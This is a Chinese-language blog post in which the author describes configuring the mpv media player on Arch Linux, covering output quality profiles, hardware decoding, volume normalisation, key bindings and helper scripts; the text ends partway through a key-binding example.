<p>自从开始用 Linux 后我一直用的是 vlc<span class="mojikumi-line-end">，</span>但总感觉有点捞<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>最明显的是在暂停继续 / 快进后退时<span class="mojikumi-line-end">，</span>经常会卡几秒<span class="mojikumi-line-end">，</span>而且不是卡住不动而是边放边卡<span class="mojikumi-line-end">，</span>感觉非常神秘<span class="mojikumi-line-end">，</span>不知道能不能修<span class="mojikumi-line-end">，</span>反正我之前简单搜过没修好<span class="mojikumi-line-end">。</span>而 mpv 默认就没有这样的问题<span class="mojikumi-line-end">，</span>早就想用了<span class="mojikumi-line-end">，</span>但之前被它简陋的 UI 以及复杂的配置劝退了<span class="mojikumi-line-end">，</span>拖到现在才入坑<span class="mojikumi-line-end">。</span></p>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-orange-1 dark:bg-orange-9 b-orange" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h2 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-alert-circle-outline text-orange" data-v-a2ab257f></span><!--v-if--><span data-v-a2ab257f>Warning</span></h2><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>我是 <a href="https://archlinux.org/">Arch Linux</a> + <a href="https://i3wm.org/">i3</a> + <a href="https://github.com/jarun/nnn">nnn</a> 用户<span class="mojikumi-line-end">，</span>下面有一些配置可能不适用于其他用户<span class="mojikumi-line-end">。</span></p></div></div></aside>
<p>完整配置<span class="mojikumi-line-end">：</span><a href="https://github.com/ouuan/dotfiles/tree/master/.config/mpv">ouuan/dotfiles/.config/mpv</a></p>
<h2 id="入坑" class="heading"><a href="#入坑" class="heading-anchor" aria-label="章节： 入坑" tabindex="-1"></a><span>入坑</span></h2>
<h3 id="参考资料" class="heading"><a href="#参考资料" class="heading-anchor" aria-label="章节： 参考资料" tabindex="-1"></a><span>参考资料</span></h3>
<ul>
<li><a href="https://wiki.archlinux.org/title/Mpv">mpv - ArchWiki</a></li>
<li><code>/<wbr>usr<wbr>/<wbr>share<wbr>/<wbr>doc<wbr>/<wbr>mpv<wbr>/</code></li>
<li><a href="https://mpv.io/manual/stable/">Reference Manual - mpv.io</a> (<code>man mpv</code>)</li>
<li>
<span class="heimu">Google</span>
</li>
<li>
<span class="heimu">ChatGPT</span>
</li>
</ul>
<h3 id="配置文件" class="heading"><a href="#配置文件" class="heading-anchor" aria-label="章节： 配置文件" tabindex="-1"></a><span>配置文件</span></h3>
<ul>
<li><code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>mpv<wbr>.<wbr>conf</code>: 主配置文件</li>
<li><code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>input<wbr>.<wbr>conf</code>: key binding 配置</li>
<li><code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>scripts<wbr>/</code>: 脚本<span class="mojikumi-line-end">，</span>放里面就会运行</li>
<li><code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>script<wbr>-<wbr>opts<wbr>/</code>: 脚本的配置<span class="mojikumi-line-end">，</span>例如 <code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>script<wbr>-<wbr>opts<wbr>/<wbr>osc<wbr>.<wbr>conf</code></li>
<li><code>/<wbr>usr<wbr>/<wbr>share<wbr>/<wbr>mpv<wbr>/<wbr>scripts<wbr>/</code>: 一些自带的脚本<span class="mojikumi-line-end">，</span>可以 symlink 到 <code>~/.<wbr>config<wbr>/<wbr>mpv<wbr>/<wbr>scripts<wbr>/</code></li>
</ul>
<p>有个冷知识 (?) 可以注意一下<span class="mojikumi-line-end">：</span></p>
<blockquote>
<p>Every <i>flag</i> option has a <i>no-flag</i> counterpart, e.g. the opposite of the <code>--fs</code> option is <code>--no-fs</code>. <code>--fs=yes</code> is same as <code>--fs</code>, <code>--fs=no</code> is the same as <code>--no-fs</code>.</p>
</blockquote>
<h2 id="输出" class="heading"><a href="#输出" class="heading-anchor" aria-label="章节： 输出" tabindex="-1"></a><span>输出</span></h2>
<p>其实我不是很懂这些<span class="mojikumi-line-end">，</span>但这两天进行各种尝试的感觉是<span class="mojikumi-line-end">，</span><s>少配点吧<span class="mojikumi-line-end">，</span>默认挺好的<span class="mojikumi-line-start">（</span></s></p>
<h3 id="输出质量" class="heading"><a href="#输出质量" class="heading-anchor" aria-label="章节： 输出质量" tabindex="-1"></a><span>输出质量</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-43"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-43--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">profile</span><span style="color: #D6DEEB">=gpu-hq</span></span>
<span><span style="color: #C792EA">profile</span><span style="color: #D6DEEB">=vo-gpu-high</span></span>
<span></span>
<span><span style="color: #D6DEEB">[vo-gpu-high]</span></span>
<span><span style="color: #C792EA">vo</span><span style="color: #D6DEEB">=gpu</span></span>
<span><span style="color: #C792EA">scale</span><span style="color: #D6DEEB">=ewa_lanczossharp</span></span>
<span><span style="color: #C792EA">cscale</span><span style="color: #D6DEEB">=ewa_lanczossharp</span></span>
<span><span style="color: #C792EA">video-sync</span><span style="color: #D6DEEB">=display-resample</span></span>
<span><span style="color: #C792EA">interpolation</span><span style="color: #D6DEEB">=yes</span></span>
<span><span style="color: #C792EA">tscale</span><span style="color: #D6DEEB">=oversample</span></span>
<span></span>
<span><span style="color: #D6DEEB">[vo-gpu-low]</span></span>
<span><span style="color: #C792EA">vo</span><span style="color: #D6DEEB">=gpu</span></span>
<span><span style="color: #C792EA">scale</span><span style="color: #D6DEEB">=spline36</span></span>
<span><span style="color: #C792EA">cscale</span><span style="color: #D6DEEB">=spline36</span></span>
<span><span style="color: #C792EA">video-sync</span><span style="color: #D6DEEB">=display-resample</span></span>
<span><span style="color: #C792EA">interpolation</span><span style="color: #D6DEEB">=no</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">profile</span><span style="color: #403F53">=gpu-hq</span></span>
<span><span style="color: #994CC3">profile</span><span style="color: #403F53">=vo-gpu-high</span></span>
<span></span>
<span><span style="color: #403F53">[vo-gpu-high]</span></span>
<span><span style="color: #994CC3">vo</span><span style="color: #403F53">=gpu</span></span>
<span><span style="color: #994CC3">scale</span><span style="color: #403F53">=ewa_lanczossharp</span></span>
<span><span style="color: #994CC3">cscale</span><span style="color: #403F53">=ewa_lanczossharp</span></span>
<span><span style="color: #994CC3">video-sync</span><span style="color: #403F53">=display-resample</span></span>
<span><span style="color: #994CC3">interpolation</span><span style="color: #403F53">=yes</span></span>
<span><span style="color: #994CC3">tscale</span><span style="color: #403F53">=oversample</span></span>
<span></span>
<span><span style="color: #403F53">[vo-gpu-low]</span></span>
<span><span style="color: #994CC3">vo</span><span style="color: #403F53">=gpu</span></span>
<span><span style="color: #994CC3">scale</span><span style="color: #403F53">=spline36</span></span>
<span><span style="color: #994CC3">cscale</span><span style="color: #403F53">=spline36</span></span>
<span><span style="color: #994CC3">video-sync</span><span style="color: #403F53">=display-resample</span></span>
<span><span style="color: #994CC3">interpolation</span><span style="color: #403F53">=no</span></span></code></pre></div></section>
<p>参考 <a href="https://wiki.archlinux.org/title/Mpv#High_quality_configurations">High quality configurations - mpv - ArchWiki</a><span class="mojikumi-line-end">。</span></p>
<p><code>scale</code> 和 <code>cscale</code> 是用于 upscale<span class="mojikumi-line-end">，</span>片源分辨率低于显示器才有用<span class="mojikumi-line-end">，</span>虽然 <code>ewa_<wbr>lanczossharp</code> 性能开销较大<span class="mojikumi-line-end">，</span>但只用于低分辨率就还好<span class="mojikumi-line-end">。</span>和 <code>spline36</code> 在视觉上的差异几乎没有<span class="mojikumi-line-end">，</span>性能不够就别用<span class="mojikumi-line-end">，</span>性能够的话用不用都行<span class="mojikumi-line-end">。</span></p>
<p>interpolation 可以参考 <a href="https://github.com/mpv-player/mpv/wiki/Interpolation">Interpolation · mpv Wiki</a><span class="mojikumi-line-end">，</span><code>tscale<wbr>=<wbr>oversample</code> 不会造成 <span class="mojikumi">“</span>soap opera effect<span class="mojikumi">”</span><wbr><span class="mojikumi-line-start">（</span>如果用 SVP 就可能会有<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span>可以找个人物动作之类的片段开 A-B loop 对比<span class="mojikumi-line-start">（</span></p>
<p>如果播放一些高码率视频<span class="mojikumi-line-end">，</span>可能会性能不够<span class="mojikumi-line-end">，</span>所以可以两个 profile 切换<span class="mojikumi-line-end">。</span></p>
<h3 id="gpu-next" class="heading"><a href="#gpu-next" class="heading-anchor" aria-label="章节： gpu-next" tabindex="-1"></a><span>gpu-next</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-44"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-44--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">[vo-gpu-next]</span></span>
<span><span style="color: #C792EA">vo</span><span style="color: #D6DEEB">=gpu-next</span></span>
<span><span style="color: #C792EA">scale</span><span style="color: #D6DEEB">=spline36</span></span>
<span><span style="color: #C792EA">cscale</span><span style="color: #D6DEEB">=spline36</span></span>
<span><span style="color: #C792EA">video-sync</span><span style="color: #D6DEEB">=audio</span></span>
<span><span style="color: #C792EA">interpolation</span><span style="color: #D6DEEB">=no</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">[vo-gpu-next]</span></span>
<span><span style="color: #994CC3">vo</span><span style="color: #403F53">=gpu-next</span></span>
<span><span style="color: #994CC3">scale</span><span style="color: #403F53">=spline36</span></span>
<span><span style="color: #994CC3">cscale</span><span style="color: #403F53">=spline36</span></span>
<span><span style="color: #994CC3">video-sync</span><span style="color: #403F53">=audio</span></span>
<span><span style="color: #994CC3">interpolation</span><span style="color: #403F53">=no</span></span></code></pre></div></section>
<p>这个最直接的作用是可以读取 Dolby Vision metadata<span class="mojikumi-line-end">，</span>不会出现颜色错误之类的<span class="mojikumi">。</span><wbr><span class="mojikumi-line-start">（</span>可以用 <a href="https://www.demolandia.net/4k-video-test/dolby-vision/page-1.html">4K Dolby Vision video test</a> 测试<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>
<p>但还是不太稳定<span class="mojikumi-line-end">，</span><code>scale<wbr>=<wbr>ewa_<wbr>lanczossharp</code> 可能会偶尔黑屏<span class="mojikumi-line-end">，</span><code>video<wbr>-<wbr>sync<wbr>=<wbr>display<wbr>-<wbr>resample</code> 会闪屏<span class="mojikumi-line-end">。</span></p>
<p>可以设个快捷键切换<span class="mojikumi-line-end">，</span>需要 <a href="https://github.com/CogentRedTester/mpv-scripts/blob/master/cycle-commands.lua"><code>cycle<wbr>-<wbr>commands<wbr>.<wbr>lua</code></a><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-45"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-45--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">G               script-message cycle-commands &#39;apply-profile vo-gpu-low ; show-text &quot;vo gpu-low&quot;&#39; &#39;apply-profile vo-gpu-next ; show-text &quot;vo gpu-next&quot;&#39; &#39;apply-profile vo-gpu-high ; show-text &quot;vo gpu high&quot;&#39;</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">G               script-message cycle-commands &#39;apply-profile vo-gpu-low ; show-text &quot;vo gpu-low&quot;&#39; &#39;apply-profile vo-gpu-next ; show-text &quot;vo gpu-next&quot;&#39; &#39;apply-profile vo-gpu-high ; show-text &quot;vo gpu high&quot;&#39;</span></span></samp></pre></div></section>
<h3 id="硬件解码" class="heading"><a href="#硬件解码" class="heading-anchor" aria-label="章节： 硬件解码" tabindex="-1"></a><span>硬件解码</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-46"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-46--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">hwdec</span><span style="color: #D6DEEB">=auto-safe</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">hwdec</span><span style="color: #403F53">=auto-safe</span></span></code></pre></div></section>
<p><code>hwdec</code> 可以实测一下来看要不要开<span class="mojikumi-line-end">，</span>之前我测的时候结果变化还挺大的<span class="mojikumi-line-end">，</span>感觉主要是 CPU 连续工作一段时间性能会下降<span class="mojikumi-line-end">，</span>而且不同视频效果也不同<span class="mojikumi-line-end">，</span>可以设 key binding 控制开关<span class="mojikumi-line-end">，</span>实时看 stats<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-47"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-47--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">g               cycle-values hwdec no auto-safe</span></span>
<span><span style="color: #d6deeb"></span></span>
<span><span style="color: #d6deeb">i               script-binding stats/display-stats-toggle</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">g               cycle-values hwdec no auto-safe</span></span>
<span><span style="color: #403f53"></span></span>
<span><span style="color: #403f53">i               script-binding stats/display-stats-toggle</span></span></samp></pre></div></section>
<h3 id="音量均衡" class="heading"><a href="#音量均衡" class="heading-anchor" aria-label="章节： 音量均衡" tabindex="-1"></a><span>音量均衡</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-48"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-48--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">af</span><span style="color: #D6DEEB">=loudnorm</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">af</span><span style="color: #403F53">=loudnorm</span></span></code></pre></div></section>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-49"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-49--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">n               cycle-values af &quot;&quot; loudnorm</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">n               cycle-values af &quot;&quot; loudnorm</span></span></samp></pre></div></section>
<p>以前听歌和看视频之间切换时经常要调音量<span class="mojikumi-line-end">，</span>加上这个就好了<span class="mojikumi-line-end">。</span></p>
<h2 id="快捷键" class="heading"><a href="#快捷键" class="heading-anchor" aria-label="章节： 快捷键" tabindex="-1"></a><span>快捷键</span></h2>
<p>key binding 很看个人习惯<span class="mojikumi-line-end">，</span>可以对着 <code>/<wbr>usr<wbr>/<wbr>share<wbr>/<wbr>doc<wbr>/<wbr>mpv<wbr>/<wbr>input<wbr>.<wbr>conf</code> 修改<span class="mojikumi-line-end">。</span>如果没啥习惯可以直接用默认的<span class="mojikumi-line-end">。</span></p>
<p>虽然感觉没太大参考价值<span class="mojikumi-line-end">，</span>但是<span class="mojikumi-line-end">：</span><a href="https://github.com/ouuan/dotfiles/blob/master/.config/mpv/input.conf">input.conf · ouuan/dotfiles</a><span class="mojikumi-line-end">。</span></p>
<h3 id="避免误触未知快捷键" class="heading"><a href="#避免误触未知快捷键" class="heading-anchor" aria-label="章节： 避免误触未知快捷键" tabindex="-1"></a><span>避免误触未知快捷键</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-50"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-50--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">no-input-default-bindings</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">no-input-default-bindings</span></span></code></pre></div></section>
<p>这个可能会影响通过脚本设置快捷键<span class="mojikumi-line-end">，</span>如果不想影响脚本可以 <code>no<wbr>-<wbr>input<wbr>-<wbr>builtin<wbr>-<wbr>bindings</code><span class="mojikumi-line-end">。</span></p>
<h3 id="右键菜单" class="heading"><a href="#右键菜单" class="heading-anchor" aria-label="章节： 右键菜单" tabindex="-1"></a><span>右键菜单</span></h3>
<p><a href="https://gitlab.com/carmanaught/mpvcontextmenu">Thomas Carmichael / mpvcontextmenu · GitLab</a></p>
<p>把 <code>mpvcontextmenu</code> 文件夹放进 <code>scripts</code><span class="mojikumi-line-end">。</span>需要安装 <code>gjs</code><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-51"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-51--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">MBTN_RIGHT      script-message mpv_context_menu_gtk</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">MBTN_RIGHT      script-message mpv_context_menu_gtk</span></span></samp></pre></div></section>
<p>调整字体<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-52"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-52--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777"># script-opts/menu-engine.conf</span></span>
<span></span>
<span><span style="color: #C792EA">fontFace</span><span style="color: #D6DEEB">=monospace</span></span>
<span><span style="color: #C792EA">fontSize</span><span style="color: #D6DEEB">=15</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1"># script-opts/menu-engine.conf</span></span>
<span></span>
<span><span style="color: #994CC3">fontFace</span><span style="color: #403F53">=monospace</span></span>
<span><span style="color: #994CC3">fontSize</span><span style="color: #403F53">=15</span></span></code></pre></div></section>
<p>它附带了通过 GUI 打开文件的功能<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span>需要安装 <code>kdialog</code> 或 <code>zenity</code><span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-53"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-53--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777"># script-opts/gui-dialogs.conf</span></span>
<span></span>
<span><span style="color: #C792EA">dialogPref</span><span style="color: #D6DEEB">=kdialog</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1"># script-opts/gui-dialogs.conf</span></span>
<span></span>
<span><span style="color: #994CC3">dialogPref</span><span style="color: #403F53">=kdialog</span></span></code></pre></div></section>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-54"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-54--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">o               script-binding add_subtitle_dialog</span></span>
<span><span style="color: #d6deeb">O               script-binding add_audio_dialog</span></span>
<span><span style="color: #d6deeb">Ctrl+o          script-binding add_files_dialog</span></span>
<span><span style="color: #d6deeb">Ctrl+O          script-binding append_files_dialog</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">o               script-binding add_subtitle_dialog</span></span>
<span><span style="color: #403f53">O               script-binding add_audio_dialog</span></span>
<span><span style="color: #403f53">Ctrl+o          script-binding add_files_dialog</span></span>
<span><span style="color: #403f53">Ctrl+O          script-binding append_files_dialog</span></span></samp></pre></div></section>
<h3 id="快进" class="heading"><a href="#快进" class="heading-anchor" aria-label="章节： 快进" tabindex="-1"></a><span>快进</span></h3>
<p>长按 <kbd>→</kbd> 快进<span class="mojikumi-line-end">。</span></p>
<p><a href="https://github.com/ouuan/dotfiles/blob/master/.config/mpv/scripts/fast-forward.lua"><code>fast<wbr>-<wbr>forward<wbr>.<wbr>lua</code></a></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-55"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-55--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">RIGHT           script-binding fast-forward</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">RIGHT           script-binding fast-forward</span></span></samp></pre></div></section>
<h3 id="每根毛都看得清清楚楚" class="heading"><a href="#每根毛都看得清清楚楚" class="heading-anchor" aria-label="章节： 每根毛都看得清清楚楚" tabindex="-1"></a><span><s>每根毛都看得清清楚楚</s></span></h3>
<p>用鼠标放大<span class="mojikumi-line-end">、</span>拖拽画面<span class="mojikumi-line-end">。</span></p>
<p><a href="https://github.com/occivink/mpv-image-viewer/blob/master/scripts/image-positioning.lua"><code>mpv<wbr>-<wbr>image<wbr>-<wbr>viewer<wbr>/<wbr>scripts<wbr>/<wbr>image<wbr>-<wbr>positioning<wbr>.<wbr>lua</code></a></p>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h4><ile-root id="ile-56"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-56--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">Ctrl+WHEEL_UP   script-message cursor-centric-zoom 0.1</span></span>
<span><span style="color: #d6deeb">Ctrl+WHEEL_DOWN script-message cursor-centric-zoom -0.1</span></span>
<span><span style="color: #d6deeb">Ctrl+MBTN_LEFT  script-binding drag-to-pan</span></span>
<span><span style="color: #d6deeb">r               script-message rotate-video  90</span></span>
<span><span style="color: #d6deeb">R               script-message rotate-video -90</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">Ctrl+WHEEL_UP   script-message cursor-centric-zoom 0.1</span></span>
